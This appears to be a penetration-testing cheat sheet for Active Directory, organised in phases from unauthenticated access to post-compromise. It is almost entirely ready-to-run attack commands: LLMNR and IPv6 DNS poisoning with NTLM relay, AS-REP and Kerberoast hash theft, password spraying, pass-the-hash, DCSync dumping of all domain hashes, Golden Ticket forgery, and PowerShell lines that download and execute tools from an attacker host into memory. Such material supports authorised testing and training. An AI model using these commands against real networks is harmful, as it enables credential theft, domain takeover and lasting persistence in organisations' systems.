# Active Directory — [Back to Main](../README.md)

**Advanced:** [ADCS, ACL Abuse, Coercion, Delegation, ZeroLogon, noPac](adcs.md)

---

## Phase 1 — No Credentials

### Initial Enumeration

```bash
# Identify DC and domain info
nmap -p 88,389,445,3268 $IP       # Kerberos + LDAP + SMB + Global Catalog = DC
nmap --script ldap-rootdse -p 389 $IP

# Null SMB session — may expose usernames, shares, domain info
nxc smb $DC_IP -u '' -p ''
smbclient -N -L \\\\$DC_IP

# LDAP anonymous bind — often allowed, leaks users
ldapsearch -x -H ldap://$DC_IP -b "" -s base namingContexts
ldapsearch -x -H ldap://$DC_IP -b "DC=domain,DC=local" "(objectClass=person)" sAMAccountName description | grep -E "sAMAccountName|description"

# Kerberos user enumeration (no password, no lockout)
kerbrute userenum --dc $DC_IP -d $DOMAIN /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o valid_users.txt
```

### LLMNR / NBT-NS Poisoning

Passively capture NTLMv2 hashes from broadcast traffic — no creds, no interaction needed.

```bash
responder -I eth0 -wd
# Hashes → /usr/share/responder/logs/ → crack with hashcat -m 5600
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```

### AS-REP Roasting

Accounts with "Do not require Kerberos preauthentication" set can be roasted without any credentials.

```bash
# Need valid username list (from kerbrute or LDAP enum above)
impacket-GetNPUsers -dc-ip $DC_IP $DOMAIN/ -usersfile valid_users.txt -format hashcat -outputfile asrep.txt

# Crack
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### Password Spray

```bash
# Check lockout policy first — one password at a time
nxc smb $DC_IP -u '' -p '' --pass-pol

kerbrute passwordspray --dc $DC_IP -d $DOMAIN valid_users.txt 'Password123!'
nxc smb $DC_IP -u valid_users.txt -p 'Password123!' --continue-on-success
```

### mitm6 — IPv6 DNS Poisoning + LDAP Relay

Most Windows machines prefer IPv6. mitm6 hijacks DHCPv6/DNS to become the victim's DNS server, then relays auth to LDAP on the DC — creating a privileged machine account automatically.

```bash
# Requirements: IPv6 on LAN (almost always true), no LDAP signing enforced

# Terminal 1: poison IPv6 DNS for the target domain
sudo mitm6 -d $DOMAIN

# Terminal 2: relay to LDAPS on DC
# Auto-creates machine account + adds to Domain Admins if relay succeeds with domain user
impacket-ntlmrelayx -6 -t ldaps://$DC_IP \
  -wh fakewpad.$DOMAIN \
  -l /tmp/loot

# Waits for Windows client authentication (reboot, network browse, etc.)
# ntlmrelayx dumps LDAP data to /tmp/loot/ and reports any created accounts

# If LDAPS relay fails (signing enforced), fall back to SMB relay
impacket-ntlmrelayx -6 -t smb://$IP -smb2support -wh fakewpad.$DOMAIN
```

> mitm6 + ntlmrelayx is one of the most reliable unauthenticated → foothold vectors on internal networks with default config.

### NTLM Relay Attack

Works when SMB signing is disabled (common on workstations, less common on DCs).

```bash
# Step 1: find hosts without SMB signing
nxc smb 192.168.1.0/24 --gen-relay-list no_signing.txt

# Step 2: configure Responder to NOT respond to SMB/HTTP (ntlmrelayx handles it)
# Edit /etc/responder/Responder.conf: SMB = Off, HTTP = Off
responder -I eth0 -wd

# Step 3: start ntlmrelayx
impacket-ntlmrelayx -tf no_signing.txt -smb2support             # dump SAM by default
impacket-ntlmrelayx -tf no_signing.txt -smb2support -c "whoami" # run command
impacket-ntlmrelayx -tf no_signing.txt -smb2support -i          # interactive SMB shell

# Trigger — victim must authenticate to us (browse to \\$LHOST\ or LLMNR poisoning redirects auth)
```

---

## Phase 2 — With Credentials

### Initial Enumeration

```bash
# Validate creds + OS info
nxc smb $DC_IP -u user -p 'password'

# Enumerate shares
nxc smb $DC_IP -u user -p 'password' --shares
smbmap -H $DC_IP -u user -p 'password' -R   # recursive listing

# LDAP — enumerate all users with descriptions
# Note: ldapsearch uses UPN format: user@DOMAIN
ldapsearch -x -H ldap://$DC_IP -D "user@$DOMAIN" -w 'password' -b "DC=domain,DC=local" \
  "(objectClass=person)" sAMAccountName description memberOf

# Enumerate domain users, groups, computers
nxc smb $DC_IP -u user -p 'password' --users
nxc smb $DC_IP -u user -p 'password' --groups
nxc smb $DC_IP -u user -p 'password' --computers

# Check if user is local admin on any host in subnet
nxc smb 192.168.1.0/24 -u user -p 'password'   # Pwn3d! = local admin
```

### BloodHound Collection

#### bloodhound-python (from LHOST — no binary on target)

```bash
# Basic — requires LDAP access to DC and DNS resolution
bloodhound-python -u user -p 'password' -d $DOMAIN -ns $DC_IP -c All --zip

# If DNS resolution fails (most common issue):
bloodhound-python -u user -p 'password' -d $DOMAIN -ns $DC_IP -c All --zip --dns-tcp
# Also try adding DC to /etc/hosts:
echo "$DC_IP  dc01.$DOMAIN $DOMAIN" >> /etc/hosts

# Force NTLM auth (helps if Kerberos negotiation fails):
bloodhound-python -u user -p 'password' -d $DOMAIN -ns $DC_IP -c All --zip --auth-method ntlm

# Lighter collection — LDAP only, no session/localadmin traffic (faster, less noisy):
bloodhound-python -u user -p 'password' -d $DOMAIN -ns $DC_IP -c DCOnly --zip

# Verify LDAP is reachable before running:
nxc ldap $DC_IP -u user -p 'password'
```

#### SharpHound via evil-winrm (Windows target with creds)

```bash
# On LHOST: serve SharpHound — download from BloodHound CE releases or SharpHound GitHub
python3 -m http.server 8080

# In evil-winrm session:
evil-winrm -i $IP -u user -p 'password'
```

```powershell
# Option A: upload binary directly (evil-winrm built-in)
upload /path/to/SharpHound.exe
.\SharpHound.exe -c All --zipfilename bh.zip --outputdirectory C:\Windows\Temp
download C:\Windows\Temp\<timestamp>_BloodHound.zip

# Option B: fetch and run from memory — nothing written to disk except the zip output
IEX(New-Object Net.WebClient).DownloadString('http://$LHOST:8080/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All -ZipFilename bh.zip -OutputDirectory C:\Windows\Temp
download C:\Windows\Temp\bh.zip

# Option C: fetch EXE over HTTP to temp and run
(New-Object Net.WebClient).DownloadFile('http://$LHOST:8080/SharpHound.exe', 'C:\Windows\Temp\sh.exe')
C:\Windows\Temp\sh.exe -c All --zipfilename bh.zip --outputdirectory C:\Windows\Temp
download C:\Windows\Temp\<timestamp>_BloodHound.zip
```

> evil-winrm `upload`/`download` paths: local path is on LHOST, remote path is on target. `download` with just a filename looks in the current remote directory.

#### Collection method options

| Flag | Collects | Notes |
|------|----------|-------|
| `All` | Everything | Slowest, most complete |
| `DCOnly` | LDAP only (users, groups, ACLs, trusts) | No agent traffic, good default |
| `Default` | LDAP + local admins + sessions | Excludes `LoggedOn` |
| `Session` | Who is logged on where | Noisy, requires admin on targets |
| `LocalAdmin` | Local admin rights | Requires admin on targets |

**Key BloodHound queries:**
- Find all Domain Admins
- Find Shortest Paths to Domain Admins
- Find Principals with DCSync Rights
- Find Kerberoastable Users (High Value)
- Find AS-REP Roastable Users

### Kerberoasting

Requests TGS tickets for service accounts (SPNs) — encrypted with service account's NTLM hash.

```bash
# impacket format: DOMAIN/user:'pass' (forward slash, no @)
impacket-GetUserSPNs -dc-ip $DC_IP $DOMAIN/user:'password' -request -outputfile kerberoast.txt

# Crack
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

> Service accounts often have weak passwords and may have over-privileged access.

### AS-REP Roasting (with creds)

```bash
# With creds — automatically enumerate all vulnerable accounts
impacket-GetNPUsers -dc-ip $DC_IP $DOMAIN/user:'password' -request -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

---

## Phase 3 — Post-Compromise

### Pass-the-Hash (PtH)

Works with NTLM hashes — no plaintext password needed.

```bash
# Check — Pwn3d! = local admin
nxc smb $IP -u Administrator -H <NTLM_HASH>

# Execute command
nxc smb $IP -u Administrator -H <NTLM_HASH> -x "whoami"

# Shells via impacket (format: DOMAIN/user@IP with -hashes :NTLM_HASH — LM part is 32 zeros)
impacket-psexec -hashes :NTLM_HASH $DOMAIN/Administrator@$IP    # creates service — noisy
impacket-wmiexec -hashes :NTLM_HASH $DOMAIN/Administrator@$IP   # WMI — quieter, no service
impacket-smbexec -hashes :NTLM_HASH $DOMAIN/Administrator@$IP

# WinRM (no domain prefix needed in -u)
evil-winrm -i $IP -u Administrator -H NTLM_HASH
```

### Pass-the-Ticket (PtT)

Use a captured/forged Kerberos ticket directly.

```bash
# Export tickets from Windows (Rubeus — on compromised host)
.\Rubeus.exe dump /nowrap    # dumps all tickets
.\Rubeus.exe tgtdeleg /nowrap  # extract TGT from current session

# Use ticket on Linux
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass $DOMAIN/user@dc01.$DOMAIN
impacket-wmiexec -k -no-pass $DOMAIN/user@target.$DOMAIN

# Convert .kirbi (mimikatz format) to .ccache
impacket-ticketConverter ticket.kirbi ticket.ccache
```

### DCSync — Requires Replication Rights (DA or equivalent)

```bash
# Dump all domain hashes (NTDS.dit equivalent)
impacket-secretsdump -dc-ip $DC_IP $DOMAIN/dauser:'password'@$DC_IP

# Just NTLM hashes
impacket-secretsdump -dc-ip $DC_IP $DOMAIN/dauser:'password'@$DC_IP -just-dc-ntlm

# Single user
impacket-secretsdump -dc-ip $DC_IP $DOMAIN/dauser:'password'@$DC_IP -just-dc-user krbtgt
```

> `krbtgt` hash → forge Golden Tickets. Administrator hash → PtH to any machine.

### Lateral Movement

```bash
# Check local admin rights across subnet
nxc smb 192.168.1.0/24 -u user -p 'password'   # Pwn3d! = local admin

# Execute on all Pwn3d hosts
nxc smb 192.168.1.0/24 -u user -p 'password' -x "whoami" --no-output

# Get shell on specific host
evil-winrm -i $IP -u user -p 'password'            # no domain prefix in -u
impacket-wmiexec $DOMAIN/user:'password'@$IP        # impacket: DOMAIN/user format
impacket-psexec $DOMAIN/user:'password'@$IP
```

### Golden / Silver Tickets

```bash
# Golden Ticket — forge TGT using krbtgt hash (domain-wide persistence)
# Get domain SID:
impacket-getPac -targetUser administrator $DOMAIN/user:'password' | grep "Domain SID"

impacket-ticketer -nthash <krbtgt_ntlm> -domain-sid <S-1-5-21-...> -domain $DOMAIN administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass $DOMAIN/administrator@dc01.$DOMAIN

# Silver Ticket — forge TGS for a specific service using service account hash
impacket-ticketer -nthash <service_ntlm> -domain-sid <S-1-5-21-...> -domain $DOMAIN -spn cifs/target.$DOMAIN user
```

### Rubeus — Windows-Side Kerberos Attacks

Run from a Windows host you control.

```powershell
# Kerberoasting — request TGS for all SPNs
.\Rubeus.exe kerberoast /outfile:krb.txt /nowrap
# hashcat -m 13100 krb.txt rockyou.txt

# AS-REP Roasting
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt /nowrap
# hashcat -m 18200 asrep.txt rockyou.txt

# Dump all tickets from current session
.\Rubeus.exe dump /nowrap

# Dump TGT for specific user
.\Rubeus.exe dump /user:administrator /service:krbtgt /nowrap

# Request TGT with password or hash
.\Rubeus.exe asktgt /user:user /password:'password' /nowrap
.\Rubeus.exe asktgt /user:user /rc4:<NTLM_HASH> /nowrap

# Pass-the-Ticket — inject ticket into current session
.\Rubeus.exe ptt /ticket:<base64_ticket>

# Overpass-the-Hash — get TGT from NTLM hash (Kerberos instead of NTLM)
.\Rubeus.exe asktgt /user:administrator /rc4:<NTLM_HASH> /ptt

# Monitor for incoming TGTs (unconstrained delegation capture)
.\Rubeus.exe monitor /interval:5 /filteruser:DC$ /nowrap
```

---

## Quick Wins Checklist

- [ ] Anonymous LDAP / null SMB → users, descriptions with passwords
- [ ] AS-REP Roasting → crackable hash with no creds
- [ ] LDAP description fields → plaintext passwords
- [ ] Kerberoast weak service accounts
- [ ] LLMNR poisoning → NTLMv2 capture → crack
- [ ] SMB relay (no signing) → SAM dump or shell
- [ ] Local admin reuse → `nxc smb subnet/24` → lateral movement
- [ ] BloodHound → shortest path from owned user to DA
